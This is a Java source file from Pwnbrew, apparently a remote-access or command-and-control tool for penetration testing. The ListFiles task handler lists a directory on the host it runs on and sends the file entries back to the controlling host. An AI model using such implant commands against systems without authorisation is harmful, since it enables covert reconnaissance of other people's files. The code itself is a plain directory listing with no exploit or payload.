/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

/*
* ListFiles.java
*
* Created on December 22, 2013, 8:21:22 PM
*/

package pwnbrew.network.control.messages;

import java.io.File;
import java.io.UnsupportedEncodingException;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ControlOption;

/**
 *
 *  
 */
@SuppressWarnings("ucd")
public final class ListFiles extends Tasking {
    
    private static final byte OPTION_PATH = 7;     
    private String theFilePath;
    
     //Class name
    private static final String NAME_Class = ListFiles.class.getSimpleName();    

    public static final short MESSAGE_ID = 0x3f;
     // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public ListFiles(byte[] passedId ) {
        super( passedId );
    }
    
     //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){        

        boolean retVal = true;    
        if( !super.setOption(tempTlv)){
            try {
                byte[] theValue = tempTlv.getValue();
                switch( tempTlv.getType()){
                    case OPTION_PATH:
                        theFilePath = new String( theValue, "US-ASCII");
                        break;
                    default:
                        retVal = false;
                        break;
                }
            } catch (UnsupportedEncodingException ex) {
                ex = null;
            }
        }
        return retVal;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) {   
    
            
        File theRemoteFile = new File(theFilePath);
        File[] fileList = theRemoteFile.listFiles();
        if( fileList != null && fileList.length != 0 ){

            //Send the count
            ControlMessage aMsg = new DirCount(getTaskId(), fileList.length);
            aMsg.setDestHostId( getSrcHostId() );
            DataManager.send(passedManager, aMsg);

            //Send a message per file
            for (File aFile : fileList) {
                aMsg = new FileSystemMsg( getTaskId(), aFile, false );
                aMsg.setDestHostId( getSrcHostId() );
                DataManager.send(passedManager, aMsg);
            }

        } else {
            FileSystemMsg aMsg = new FileSystemMsg( getTaskId(), null, false );
            aMsg.setDestHostId( getSrcHostId() );
            DataManager.send(passedManager, aMsg);
        }
    
    }

}
